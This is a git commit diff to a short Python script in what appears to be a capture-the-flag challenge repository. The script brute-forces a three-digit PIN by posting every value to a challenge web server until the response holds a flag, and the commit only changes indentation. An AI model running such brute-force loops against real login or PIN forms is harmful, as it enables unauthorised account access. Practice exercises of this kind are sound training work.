6c915e54ff6cfa371c787e1ae1748b1eed2add64
HLOverflow <snowyx10mini@gmail.com>
2016-08-21 01:19:02 +0800

    Update brute.py

--- challenge7/brute.py
+++ challenge7/brute.py
@@ -7,7 +7,7 @@ for i in range(0, 999):
     html = requests.post("http://web.spro.ink:3006/", data={"num":"%03d" % i}).text
 	
 	if "flag" in html:
-        print "The PIN is %03d" % i
+		print "The PIN is %03d" % i
 		print html
 	else:
 		pass
